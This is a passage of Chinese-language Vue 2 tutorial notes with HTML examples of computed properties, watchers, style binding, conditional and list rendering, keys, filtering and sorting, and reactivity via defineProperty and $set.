​						2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。



计算属性的简写

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-姓名信息-计算属性简写</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        姓：<input type="text" v-model="firstName" /> <br/><br/>
        名：<input type="text" v-model="lastName" /> <br/><br/>
        全名: <span>{{fullName}}</span>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                firstName:'张',
                lastName:'三'
            },
            methods:{
            },
            computed:{
                //完整写法
                /*fullName:{
                    //get的作用：当有人读取fullname时，get会被调用，会返回值就作为fullname的值
                    //get什么时候被调用呢？1，初次读取fullname时，2，所依赖的数据发生变化时
                    //在计算属性中，存在缓存，不是每次都加载
                    //当计算属性往VM对象中加入时，它并不直接加入了VM的一个方法，向是拿到get的返回值，放入至VM
                    get(){
                        console.log('get被调用了');
                        return this.firstName + '-' + this.lastName;
                    },
                    //set什么时候会被调用，当fullName被修改时
                    set(value){
                        console.log('set',value);
                        const arr = value.split('-');
                        this.firstName = arr[0];
                        this.lastName = arr[1];
                    }
                }*/
               //简写
               //简写仅针对只存在get函数的情况，如果既有get又有set不能简写
               fullName(){
                console.log('get被调用了');
                return this.firstName + '-'+this.lastName;
               }
            }
        })
    </script>
</body>
</html>
```





### 1.8 监视属性

#### 1.8.1 监视属性基础

切换天气

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-切换天气</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天天气{{info}}</h2><br/>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button> -->
        <button @click="changeWather">切换天气</button>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                isHot: true,
            },
            computed:{
                info:{
                    get(){
                        return this.isHot ? '炎热' : '凉爽';
                    }
                }
            },
            methods:{
                changeWather(){
                    this.isHot = !this.isHot;
                }
            }
        })
    </script>
</body>
</html>
```

效果

![image-20241229213507745](.\images\image-20241229213507745.png)

点击切换后

![image-20241229213546657](.\images\image-20241229213546657.png)

#### 1.8.2 监视属性语法

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-切换天气</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天天气{{info}}</h2><br/>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button> -->
        <button @click="changeWather">切换天气</button>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                isHot: true,
            },
            computed:{
                info:{
                    get(){
                        return this.isHot ? '炎热' : '凉爽';
                    }
                }
            },
            methods:{
                changeWather(){
                    this.isHot = !this.isHot;
                }
            },
            watch:{
                isHot:{
                    //初始化时让handler调用一下,如果不添加初始化的时候不执行
                    immediate:true, 
                    handler(newValue,oldValue)
                    {
                        console.log('值被修改了:newValue',newValue,'oldValue',oldValue);
                        
                    }
                }
            }
        })
    </script>
</body>
</html>
```

执行：

![image-20241229213822227](.\images\image-20241229213822227.png)

切换后

![image-20241229213902091](.\images\image-20241229213902091.png)

可以观察到，在添加immediate后，首次值为'undefined'，因为首次还没有被赋值。而在第一次点击后，值就从初始化的false，切换到了false.

#### 1.8.3 监视属性动态配制

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-切换天气</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天天气{{info}}</h2><br/>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button> -->
        <button @click="changeWather">切换天气</button>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                isHot: true,
            },
            computed:{
                info:{
                    get(){
                        return this.isHot ? '炎热' : '凉爽';
                    }
                }
            },
            methods:{
                changeWather(){
                    this.isHot = !this.isHot;
                }
            },
            watch:{
                /* isHot:{
                    //初始化时让handler调用一下,如果不添加初始化的时候不执行
                    immediate:true, 
                    handler(newValue,oldValue)
                    {
                        console.log('值被修改了:newValue',newValue,'oldValue',oldValue);
                        
                    }
                } */
            }
        });

        vm.$watch('isHot',{
            immediate:false,
            handler(newValue,oldValue){
                console.log('值被修改了:newValue',newValue,'oldValue',oldValue);
            }
        })
    </script>
</body>
</html>
```

此通过vm对象动态的配制watch，实现的效果与之前提一致。如果在创建对象时已经确定监视对象，则使用watch，如果在创建时不确定，通过监视对象改变后触发，则应该使用动态配制。

监视属性总结：

>1. 当被监视的属性变化时，回调函数自动调用，进行相关操作。
>2. 监视的属性必须存在，才能进行监视。
>3. 监视的两种写法：
>   1. new Vue时传入watch的配制。
>   2. 通过vm.$watch监视。

#### 1.8.4 深度监视

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-切换天气</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>多级结构的值1:{{deep1.deep2.deep3.dataValue1}}</h2><br/>
        <button @click="deep1.deep2.deep3.dataValue1++">改变</button><br/>

        <h2>多级结构的值2:{{deep1.deep2.deep3.dataValue2}}</h2><br/>
        <button @click="deep1.deep2.deep3.dataValue2++">改变</button><br/>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                deep1:{
                    deep2:{
                        deep3:{
                            dataValue1:1,
                            dataValue2:1,
                        }
                    }
                }
            },
            watch:{
                //监视多级节点中某个属性的变化。
                'deep1': {
                    deep:true,
                    handler()
                    {
                        console.log('收到通知，值被修改了');                        
                    }
                }
            }
        })
    </script>
</body>
</html>
```

效果

![image-20241229222929302](.\images\image-20241229222929302.png)

总结：

​    深度监视：

​      （1）： Vue中的watch默认不监视对象内部值的改变（一层）

​       (2):  配制deep:true 可以监测对象内部值改变（多层）

​    备注：

​       (1）. Vue 自身可以监测对象内部值的改变，会是Vue提供的watch默认不可以！

​       (2) . 使用watch时根据数据的具体结构，否采用深度监视。

#### 1.8.5 监视-简写

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-切换天气</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天天气{{info}}</h2><br/>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button> -->
        <button @click="changeWather">切换天气</button>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                isHot: true,
            },
            computed:{
                info:{
                    get(){
                        return this.isHot ? '炎热' : '凉爽';
                    }
                }
            },
            methods:{
                changeWather(){
                    this.isHot = !this.isHot;
                }
            },
            watch:{
                //如果监视的属性不需要immediate也不需要deep,仅存在hadler时，则可以简写
                isHot(newValue,oldValue){
                    console.log('值被修改了:newValue',newValue,'oldValue',oldValue);
                }
            }
        })
    </script>
</body>
</html>
```

动态配制的简写

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-切换天气</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>今天天气{{info}}</h2><br/>
        <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button> -->
        <button @click="changeWather">切换天气</button>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                isHot: true,
            },
            computed:{
                info:{
                    get(){
                        return this.isHot ? '炎热' : '凉爽';
                    }
                }
            },
            methods:{
                changeWather(){
                    this.isHot = !this.isHot;
                }
            },
            //简写
           /*  watch:{
                //如果监视的属性不需要immediate也不需要deep,仅存在hadler时，则可以简写
                isHot(newValue,oldValue){
                    console.log('值被修改了:newValue',newValue,'oldValue',oldValue);
                }
            } */
        });

        vm.$watch('isHot',function(newValue,oldValue){
                    console.log('值被修改了:newValue',newValue,'oldValue',oldValue);
                });
        
    </script>
</body>
</html>
```

#### 1.8.6 监视-姓名实现

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-姓名</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
	</div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                firstName: '张',
                lastName: '三',
                fullName: '张-三'
            },
            watch:{
                firstName(value){
                    setTimeout(() => {
                        this.fullName = value + '-' + this.lastName;    
                    }, 2500);
                },
                lastName(value){
                    this.fullName = this.firstName + '-' + this.lastName;
                }
            }
        });
        
    </script>
</body>
</html>
```

> computed和watch之间的区别：
>
> 1.computed能完成的功能，watch都可以完成。
> 2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
>
> 两个重要的小原则：
> 1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
> 2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，
> 								这样this的指向才是vm 或 组件实例对象。

### 1.9 动态绑定样式

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-绑定样式</title>
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        .basic{
            float: top;
            padding-top: 15px;
            width: 300px;
            height: 200px;
            border: 1px solid black;
        }
        .happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
        }
        .sad{
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }
        .normal{
            background-color: skyblue;
        }

        .null1{
            background-color: yellowgreen;
        }
        .null2{
            font-size: 30px;
            text-shadow:2px 2px 10px red;
        }
        .null3{
            border-radius: 20px;
        }
    </style>

</head>
<body>
    <div id="root">
        <!-- 绑定css样式字符串写法，适用于类名不确定，需要动态指定的场景 -->
       <div class="basic" :class="mood" @click="changeMood">{{name}}</div>

        <!-- 绑定css样式-数组写法，适用于要绑定的样式个数不确定，名字也不确定 -->
        <div class="basic" :class="classArray">{{name}}</div>

        <!--  绑定class样式--对象写法，适用于：要绑定的样式个数确定，名称确定，但动态决定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div>

        <!--  绑定style样式,对象写法 -->
        <div class="basic" :style="styleObj">{{name}}</div>

        <!--  绑定style样式,数组写法 -->
        <div class="basic" :style="styleArray">{{name}}</div>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name: "nullnull",
                mood: 'normal',
                classArray: ['null1','null2','null3'],
                classObj: {
                    null1: false,
                    null2: false
                },
                styleObj:{
                    fontSize: '40px',
                    color: 'red'
                },
                styleArray:[
                    {
                         fontSize: '40px',
                         color: 'blue'
                    },
                    {
                        backgroundColor: 'gray'
                    }
                ]
            },
            methods: {
                changeMood(){
                    const arr = ['happy','sad','normal'];
                    const index = Math.floor(Math.random() * 3);
                    this.mood = arr[index];
                }
            }           
        })
    </script>
</body>
</html>
```

>绑定样式：
>					1. class样式
>								写法:class="xxx" xxx可以是字符串、对象、数组。
>										字符串写法适用于：类名不确定，要动态获取。
>										对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
>										数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
>					2. style样式
>								:style="{fontSize: xxx}"其中xxx是动态值。
>								:style="[a,b]"其中a、b是样式对象。

### 1.10 条件渲染

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-条件渲染</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
       <h2>当前n的值是:{{n}}</h2>
       <button @click="n++">点击n+1</button>
       <!-- 使用v-show作条件渲染会在页面添加一个样式：style="display: none;" -->
       <!-- <h2 v-show="false">欢迎来到1{{name}}</h2>
       <h2 v-show="n % 2 == 1">欢迎来到1{{name}}</h2> -->

       <!-- 使用v-if做条件渲染,使用v-if条判断时，页面连标签都不会出现 -->
       <!-- <h2 v-if="n % 2 == 1">欢迎来到2{{name}}</h2> -->

       <!-- 使用if-elseif-else语法 -->
       <h2 v-if="n == 1">欢迎来到3-if1:{{name}}</h2>
       <h2 v-else-if ="n == 2">欢迎来到3-elseif2:{{name}}</h2>
       <h2 v-else>欢迎来到3-if3:{{name}}</h2>
       <br/>

       
        <!-- 如果要使用if将多个标签进行一起的控制显示-->
         <template v-if="n === 1">
                <h2>你好</h2>
				<h2>nullnull</h2>
				<h2>上海</h2>
         </template>

    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                n: 0,
                name: "nullnull"
            }                
        })
    </script>
</body>
</html>
```



### 1.11 列表渲染

#### 1.11.1 v-for使用

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-列表渲染</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
      <!-- 遍历数组, 使用in或者of都可以 -->
       <h2>按数组遍历</h2>
       <ul>
            <li v-for="(p,index) in dataArray" :key="p.id">
                {{p.name}} - {{p.age}}
            </li>
       </ul>
       <!-- 遍历对象 -->
       <h2>按对象遍历</h2>
       <ul>
            <li v-for="(p,index) of dataObjCar" :key="index">
                {{p}} 
            </li>
        </ul>
        <!-- 遍历字符串 -->
        <h2>按字符串遍历</h2>
         <ul>
            <li v-for="(char,index) of dataStr" :key="index">
                {{char}}
            </li>
         </ul>
         <!-- 遍历指定的次数 -->
         <h2>遍历指定的次数</h2>
         <ul>
            <li v-for="(number,index) of 3" :key="index">
                {{number}} - {{index}}
            </li>
         </ul>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name: "nullnull",
                dataArray:[
                    {
                        id:'001',
                        name: '张三',
                        age: 18
                    },
                    {
                        id: '002',
                        name:'李四',
                        age: 19
                    },
                    {
                        id: '003',
                        name: '王五',
                        age: 20
                    }
                ],
                dataObjCar:{
                    name:'宝马M3',
                    price: '118万',
                    color: '蓝色'
                },
                dataStr: 'nullnull'
            }                
        })
    </script>
</body>
</html>
```



#### 1.11.2 key的使用

key使用index所存在的问题

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-列表渲染</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2>人员列表（遍历数组）</h2>
        <button @click="add">添加一个对象</button>
        <ul>
            <li v-for="(p,index) of dataArray" :key="index">
                {{p.name}} - {{p.age}}
                <input type="text" />
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name: "nullnull",
                dataArray:[
                    {
                        id:'001',
                        name: '张三',
                        age: 18
                    },
                    {
                        id: '002',
                        name:'李四',
                        age: 19
                    },
                    {
                        id: '003',
                        name: '王五',
                        age: 20
                    }
                ]
            },
            methods: {
                add(){
                    const p = {
                        id: '004',
                        name: '老刘',
                        age: 28 
                    };
                    this.dataArray.unshift(p);
                }
            }                
        })
    </script>
</body>
</html>
```

打开服务，并在浏览器上访问：输入信息，然后点击添加一个对象

![image-20250101093139193](.\images\image-20250101093139193.png)

此时就会发现对象已经错乱了。那是为什么呢？

![img](.\images\20250101_092749018.jpg)

这是由于在虚拟Dom在向真实Dom转换的过程中会进行对比，对比的键就是指定的Key，而key采用的index编号，此编号在每次遍历时就会重新生成，而真实的Dom并不会,这就会导致原来索引为0的内容老张与现在新创建的索引为0的老刘相对应，从而造成错乱，那要解决这个问题也很容易，一般不建议使用index使用key，除非明确不存在修改的场景，或者不会有打乱索引排序的操作。

解决方案：

1. 使用数据主键作为Key
2. 新的数据插入到最后。

数据使用id作为Key

```html
<!-- 将原来的 -->
<li v-for="(p,index) of dataArray" :key="index">
<!-- 改为 -->
<li v-for="(p,index) of dataArray" :key="p.id">
```

此时页面即可正常操作

![image-20250101093721871](.\images\image-20250101093721871.png)

新的数据插入到最后

```html
<!-- 将原来的 -->
this.dataArray.unshift(p);
<!-- 改为 -->
this.dataArray.push(p);
```

页面即可正常操作

![image-20250101093937743](D:\java\myself\learn\learn-md\vue\images\image-20250101093937743.png)

react、Vue中的Key有什么用呢？

>1. 虚拟Dom中Key的作用：
>
>   Key是虚拟DOm对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟Dom】，
>
>   随后Vue进行【新虚拟Dom】与【旧虚拟DOM】的差异比较，
>
>   比较规则：
>
>   1. 旧虚拟Dom中找到了与新虚拟DOM中相同的Key：
>
>      若虚拟DOM中内容没变，直接使用之前的虚拟DOM！
>
>      若虚拟DOM中的内容发生了变化，则生成新的真实DOM，随后替换页面中之前的真实DOM。
>
>   2. 旧虚拟DOM中未找到与新虚拟DOM相同的Key：
>
>      创建新的真实DOM，随后渲染到页面。
>
>2. 使用index作为key可能会引发的问题：
>
>   1. 若对数据进行逆序添加、逆序删除等破坏顺序操作：会产生没有必要的真实DOM更新，界面效果没问题，但效率低。
>
>   2. 如果结构中还包含输入类的DOM：会产生错误的DOM更新，界面有问题。
>
>3. 开发中如何选择Key？
>
>   1.  最好选择使用数据的唯一标识作为key，比如id，手机号、身份证号、学号等唯一值。
>   2. 如果不存在数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index是没有问题的。
>
>   



#### 1.11.3 列表过滤

使用watch来实现

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-列表过滤</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

    <div id="root">
        <h2>人员列表</h2>
        <!-- 绑定键盘输入事件 -->
        <input type="text" placeholder="请输入名称" v-model="keyWord">
        <ul>
            <li v-for="(p,index) of fliterArray" :key="p.id">
                {{p.name}} - {{p.age}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name: "nullnull",
                keyWord: '',
                dataArray:[
                    {
                        id:'001',
                        name: '马冬梅',
                        age: 18
                    },
                    {
                        id: '002',
                        name:'周冬雨',
                        age: 19
                    },
                    {
                        id: '003',
                        name: '周杰伦',
                        age: 20
                    },
                    {
                        id: '004',
                        name: '温兆伦',
                        age: 23
                    }
                ],
                fliterArray: []
            },
            watch:{
                keyWord:{
                    //初始化时让handler调用一下,如果不添加初始化的时候不执行
                    immediate: true,
                    handler(val){
                        this.fliterArray = this.dataArray.filter((p)=>{
                            return p.name.indexOf(val) !== -1;
                        });
                    }
                }
            }       
        })
    </script>
</body>
</html>
```



![image-20250101102735653](.\images\image-20250101102735653.png)

使用计算属性来实现

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-列表过滤</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

    <div id="root">
        <h2>人员列表</h2>
        <!-- 绑定键盘输入事件 -->
        <input type="text" placeholder="请输入名称" v-model="keyWord">
        <ul>
            <li v-for="(p,index) of fliterArray" :key="p.id">
                {{p.name}} - {{p.age}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name: "nullnull",
                keyWord: '',
                dataArray:[
                    {
                        id:'001',
                        name: '马冬梅',
                        age: 18
                    },
                    {
                        id: '002',
                        name:'周冬雨',
                        age: 19
                    },
                    {
                        id: '003',
                        name: '周杰伦',
                        age: 20
                    },
                    {
                        id: '004',
                        name: '温兆伦',
                        age: 23
                    }
                ]
            },
            computed: {
                fliterArray() {
                    return this.dataArray.filter( (p) => {
                        return p.name.indexOf(this.keyWord) !== -1;   
                    }                                            
                    );
                }
            }
        })
    </script>
</body>
</html>
```

效果

![image-20250101103436829](.\images\image-20250101103436829.png)



#### 1.11.4 列表过滤排序

使用计算属性来实现

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-列表过滤排序</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

    <div id="root">
        <h2>人员列表</h2>
        <!-- 绑定键盘输入事件 -->
        <input type="text" placeholder="请输入名称" v-model="keyWord"> 
        <button @click="sortType=0">原顺序</button>
        <button @click="sortType=1">年龄升序</button>
        <button @click="sortType=2">年龄降序</button>
        <ul>
            <li v-for="(p,index) of fliterArray" :key="p.id">
                {{p.name}} - {{p.age}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name: "nullnull",
                keyWord: '',
                //0原顺序 1降序 2升序
                sortType: 0,
                dataArray:[
                    {
                        id:'001',
                        name: '马冬梅',
                        age: 22
                    },
                    {
                        id: '002',
                        name:'周冬雨',
                        age: 33
                    },
                    {
                        id: '003',
                        name: '周杰伦',
                        age: 15
                    },
                    {
                        id: '004',
                        name: '温兆伦',
                        age: 23
                    }
                ]
            },
            computed: {
                fliterArray() {
                    //数据过滤操作
                     const filterArrayRsp =  this.dataArray.filter( (p) => {
                        return p.name.indexOf(this.keyWord) !== -1;   
                    }                                            
                    );
                    //数据排序操作
                    if(this.sortType === 0)
                    {
                        return filterArrayRsp;
                    }

                    //升序
                    if(this.sortType === 1)
                    {
                        filterArrayRsp.sort((item1,item2)=> {
                            return item1.age - item2.age;
                        })
                    }

                    //年龄降序
                    if(this.sortType === 2)
                    {
                        filterArrayRsp.sort((item1,item2)=> {
                            return item2.age - item1.age;
                        })
                    }


                    return filterArrayRsp;
                }
            }
        })
    </script>
</body>
</html>
```

输出 

![image-20250101111202730](.\images\image-20250101111202730.png)

使用watch来实现

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-列表过滤排序</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

    <div id="root">
        <h2>人员列表</h2>
        <!-- 绑定键盘输入事件 -->
        <input type="text" placeholder="请输入名称" v-model="keyWord"> 
        <button @click="sortType=0">原顺序</button>
        <button @click="sortType=1">年龄升序</button>
        <button @click="sortType=2">年龄降序</button>
        <ul>
            <li v-for="(p,index) of fliterArray" :key="p.id">
                {{p.name}} - {{p.age}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name: "nullnull",
                keyWord: '',
                //0原顺序 1降序 2升序
                sortType: 0,
                dataArray:[
                    {
                        id:'001',
                        name: '马冬梅',
                        age: 22
                    },
                    {
                        id: '002',
                        name:'周冬雨',
                        age: 33
                    },
                    {
                        id: '003',
                        name: '周杰伦',
                        age: 15
                    },
                    {
                        id: '004',
                        name: '温兆伦',
                        age: 23
                    }
                ],
                fliterArray: []
            },
            watch: {
                keyWord:{
                    //初始化时让handler调用一下,如果不添加初始化的时候不执行
                    immediate: true,
                    handler(val){
                        const filterRsp = this.dataArray.filter((item)=>{
                            return item.name.indexOf(val) !== -1;
                        });

                        this.fliterArray  = filterRsp;
                    }                    
                },
                sortType: {
                    handler(value){
                        const filterRsp =  this.fliterArray;
                        //年龄升序
                        if(this.sortType == 1)
                        {
                            this.fliterArray = filterRsp.sort((item1,item2)=>{
                                return item1.age - item2.age;
                            })
                        }

                        //年龄降序
                        if(this.sortType == 2)
                        {
                            this.fliterArray = filterRsp.sort((item1,item2)=>{
                                return  item2.age - item1.age;
                            })
                        }
                    }
                }
            }
        })
    </script>
</body>
</html>
```

输出:

![image-20250101111548591](.\images\image-20250101111548591.png)



#### 1.11.5 修改值的问题

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-更新的问题</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

    <div id="root">
        <h2>人员列表</h2>
        <!-- 绑定键盘输入事件 -->
        <button @click="updateMei">更新马冬梅的信息</button>
        <ul>
            <li v-for="(p,index) of dataArray" :key="p.id">
                {{p.name}} - {{p.age}}
            </li>
        </ul>
    </div>
    <script type="text/javascript">
        //阻止 vue 在启动时生成生产提示。
        Vue.config.productionTip = false 
        const vm = new Vue({
            el: '#root',
            data:{
                name: "nullnull",
                keyWord: '',
                //0原顺序 1降序 2升序
                sortType: 0,
                dataArray:[
                    {
                        id:'001',
                        name: '马冬梅',
                        age: 22
                    },
                    {
                        id: '002',
                        name:'周冬雨',
                        age: 33
                    },
                    {
                        id: '003',
                        name: '周杰伦',
                        age: 15
                    },
                    {
                        id: '004',
                        name: '温兆伦',
                        age: 23
                    }
                ]
            },
            methods: {
                updateMei(){
                    /* 
                    此修改值的方式是成功
                    this.dataArray[0].name = '马马', 
                    this.dataArray[0].age = 50,
                    this.dataArray[0].sex = '男'
                    */

                    //此修改是不成功的
                    //splice 方法可以接受三个及以上的参数：
                    // start：必需。规定从何处开始修改数组。
                    // deleteCount：必需。规定应该删除多少元素。如果设置为 0，则不删除任何元素。
                    // item1, ..., itemN：可选。要添加进数组的新元素。
                    //从下标为0的位置开始，修改1个元素
                    this.dataArray.splice(0,1,{
                        id:'001',
                        name: '马冬梅2',
                        age: 25
                    })
                }
            },
        })
    </script>
</body>
</html>
```

由此问题将引出Vue的监视的原理

#### 1.11.6 Vue的属性模拟监视

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-模拟一个监控</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

    <div id="root">
    </div>
    <script type="text/javascript">
       let data = {
        name: 'nullnull',
        address: '上海'
       }
    
       const obj = new ObjServer(data);
       console.log(obj);



       function ObjServer(obj){
        //汇总对外中所有的属性为一个数组 
        const keys = Object.keys(obj);
        //遍历
        keys.forEach((k)=>{
                Object.defineProperty(this,k,{
                    get(){
                        return obj[k];
                    },
                    set(value){
                        console.log("数据被改变变了，最新的数据是:",value);
                        obj[k] = value;
                    }
                })
        });

       }
    </script>
</body>
</html>
```

#### 1.11.7 模拟监视

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-模拟一个监控</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

    <div id="root">
    </div>
    <script type="text/javascript">
       let data = {
        name: 'nullnull',
        address: '上海'
       }
    
       const obj = new ObjServer(data);
       console.log(obj);



       function ObjServer(obj){
        //汇总对外中所有的属性为一个数组 
        const keys = Object.keys(obj);
        //遍历
        keys.forEach((k)=>{
                Object.defineProperty(this,k,{
                    get(){
                        return obj[k];
                    },
                    set(value){
                        console.log("数据被改变变了，最新的数据是:",value);
                        obj[k] = value;
                    }
                })
        });

       }
    </script>
</body>
</html>
```

#### 1.11.8 Vue的属性set使用

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-模拟一个监控</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

    <div id="root">
        <h1>学校信息</h1>
        <h2>学校名称：{{school.name}}</h2>
        <h2>学校地址：{{school.address}}</h2>
        <h2>校长：{{school.leader}}</h2>
        <hr/>
        <h2>学生信息</h2>
        <button @click="addSex">添加一个性别属性</button>
        <h2>姓名：{{student.name}}</h2>
        <h2 v-if="student.sex">性别：{{student.sex}}</h2>
        <h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
			<h2>朋友们</h2>
			<ul>
				<li v-for="(f,index) in student.friends" :key="index">
					{{f.name}}--{{f.age}}
				</li>
			</ul>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

        const vm = new Vue({
            el: '#root',
            data:{
                school:{
                    name: 'nullnull',
                    address: '上海'
                },
                student:{
                    name: 'tom',
                    age:{
                        rAge:40,
                        sAge:29
                    },
                    friends:[
                        {name:'jerry',age:35},
                        {name:'tony',age:36}
                    ]
                }
            },
            methods:{
                addSex(){
                    //Vue.set(this.student,'sex','男');
                    //此实例本身就是vue，所以可使用this
                    this.$set(this.student,'sex','男')
                }
            }
        });
    </script>
</body>
</html>
```



#### 1.11.9 的属性数组元素的动态添加

```html
<!DOCTYPE html>
<html>
<body>
<head>
    <meta charset="UTF-8"/>
    <title>VUE-模拟一个监控</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

